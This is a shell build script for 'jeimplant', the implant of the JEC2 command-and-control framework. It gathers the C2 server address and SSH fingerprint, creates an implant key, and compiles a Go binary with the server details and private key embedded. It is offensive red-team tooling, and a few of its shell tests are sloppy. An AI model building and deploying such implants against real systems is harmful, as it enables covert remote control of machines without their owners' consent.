#!/bin/sh
#
# buildimplant.sh
# Build script for jeimplant
# By J. Stuart McMurray
# Created 20220326
# Last Modified 20220402

set -e

# Turn on debugging if we're asked
if [ -n "$DEBUG" ]; then set -x; fi

# Variables
# JEC2DIR
# CONFIG
# ADDR - External address
# C2H - C2 Address
# C2P - C2 Port
# FP - C2 Fingerprint
# SKF - Server keyfile
# IKF - Implant keyfile, created if it doesn't exist

# Warn the user this script is experimental and subject to change
echo "Warning: This script is experimental, not well-tested, and subject to change." >&2

# Make sure we have a compiler
echo -n "Checking for the Go compiler..."
go version

# Where to guess we find JEC2 things
if [ -z "$JEC2DIR" ]; then
        echo "JEC2DIR unset, defaulting to ${JEC2DIR:="./jec2"}" >&2
fi

# If we have jq and a config grab some defaults from the config.
CONFIG="${CONFIG:-"$JEC2DIR/config.json"}"
if ! [ -f "$CONFIG" ]; then # No config file
        echo "Config file $CONFIG not found" >&2
        echo "Consider setting CONFIG for better defaults" >&2
elif ! which jq >/dev/null 2>&1; then # No jq
        echo "jq not found; unable to extract defaults from $CONFIG" >&2
elif ! jq . "$CONFIG" >/dev/null >&1; then # Can't parse config
        echo "Error parsing $CONFIG" >&2
        jq . "$CONFIG"
else # Config's usable
        # Default address, for the implant
        ADDR="${ADDR:-"$(jq -r '
        if 0 < (.Listeners.TLS | length) then
                "tls://" + .Listeners.TLS
        elif 0 < (.Listeners.SSH | length) then
                "ssh://" + .Listeners.SSH
        else
                ""
        end' $CONFIG)"}"
        C2H="${C2H:-"$(jq -r '.Listeners.SSH | split(":")[0]' "$CONFIG")"}"
        C2P="${C2P:-"$(jq -r '.Listeners.SSH | split(":")[1]' "$CONFIG")"}"
fi

# Make sure we have a server address
if [ -z "$ADDR" ]; then
        echo "Need a server address (ADDR)" >&2
        exit 2
fi
echo "Server address...$ADDR"


# getfpwithauth tries to get the server fingerprint by connecting to jeserver
# and asking.
getfpwithauth(){
        echo -n "Attempting to get server fingerprint with fingerprint" \
                "command..."
        CMD="ssh -o BatchMode=yes${C2P:+" -p $C2P"}"
        # If we have a default key lying about, try that too
        if [ -f "$JEC2DIR/id_ed25519_operator" ]; then
                CMD="$CMD -i $JEC2DIR/id_ed25519_operator"
        fi
        # Make sure we know where to connect
        if [ -z "$C2H" ]; then
                echo "Can't server fingerprint without "\
                        "jeserver's address (C2H)" >&2
                return
        fi
        if [ -z "${FP:="$($CMD $C2H fingerprint)"}" ]; then
                echo "Failed"
        fi
}
if [ -n "$DEBUG" ]; then
        typeset -ft getfpwithauth
fi
if [ -n "$FP" ]; then
        echo -n "Server fingerprint "
fi
# Try to auth and get it
if [ -z "$FP" ]; then
        getfpwithauth
fi
# Faild, try to banner-grab and get it
if [ -z "$FP" ] && [ -n "$C2H" ]; then 
        echo -n "Attempting to banner-grab server fingerprint..."
        CMD="ssh-keyscan${C2P:+" -p $C2P"} $C2H"
        if [ -z "${FP:="$($CMD | \
                ssh-keygen -lf - | tail -n 1 | awk '{print $2}')"}" ]; then
                echo "Failed"
        fi
fi
# Still don't have it, use the keyfile.
if [ -z "$FP" ] && [ -n "${SKF:="$JEC2DIR/id_ed25519_server"}" ]; then
        echo -n "Attempting to get server fingerprint from default keyfile" \
                "$SKF..."
        FP="$(ssh-keygen -lf $SKF | cut -f 2 -d ' ')"
fi
# Still don't have it, we just failed
if [ -z "$FP" ]; then
        echo "Server fingerprint needed (FP)" >&2
        exit 3
fi
echo "$FP"

# Get or make an implant key
if ! [ -f "${IKF:="$JEC2DIR/id_ed25519_implant"}" ]; then
        echo -n "Implant key $IKF not found, creating..."
        if ! ssh-keygen -t ed25519 -f "$IKF" -q -N ""; then
                exit
        fi
else
        echo -n "Implant key ($IKF) fingerprint..."
fi 
ssh-keygen -lf "$IKF" | cut -f 2 -d ' '

# Build the thing
if ! [ -f "${JEC2SRCDIR:="./cmd/jeimplant"}/jeimplant.go" ]; then
        echo "Source directory $JEC2SRCDIR (JEC2SRCDIR) doesn't have jeimplant.go" >&2
        exit 1
fi
if [ "-z" $OF ]; then
        if [ -d "./bin" ]; then
                OF="./bin"
        elif [ -d "$JEC2SRCDIR/../../bin" ]; then
                OF=$(cd $JEC2SRCDIR/../../bin && pwd)
        fi
        OF="$OF/jeimplant"
        if [ -n "$GOARCH" ] || [ -n "$GOOS" ]; then
                OF="$OF-$(go env GOOS)-$(go env GOARCH)"
        fi
fi
echo -n "Building $OF from $JEC2SRCDIR..."
LDFLAGS="-X main.ServerAddr=$ADDR -X main.ServerFP=$FP"
LDFLAGS="$LDFLAGS -X main.PrivKey=$(cat $IKF | openssl base64 -A)"
LDFLAGS="$LDFLAGS${CV:+" -X main.SSHVersion=$CV"}"
go build -trimpath -o "$OF" -ldflags "$LDFLAGS" "$JEC2SRCDIR"
echo done

# Show the user what we've got
if [ "GOOS=$(go env GOHOSTOS)" == "$(go version -m $OF | \
        egrep -o 'GOOS=.*')" ] && [ "GOARCH=$(go env GOARCH)" == \
        "$(go version -m $OF | egrep -o 'GOARCH=.*')" ]; then
        $OF -h
fi
